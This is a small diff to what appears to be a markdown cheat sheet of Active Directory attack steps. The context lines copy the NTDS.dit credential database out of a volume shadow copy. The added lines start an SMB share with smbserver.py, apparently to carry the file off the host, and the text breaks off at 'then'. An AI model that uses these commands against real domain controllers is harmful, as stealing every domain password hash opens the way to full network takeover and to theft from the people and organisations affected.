@@ -42,3 +42,8 @@ Copy to another location:
 	\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit 
 	c:\NTDS\NTDS.dit 
 ```
+create a share 
+```bash 
+python3 smbserver.py --smb2support CompData /tmp/share
+```
+then 
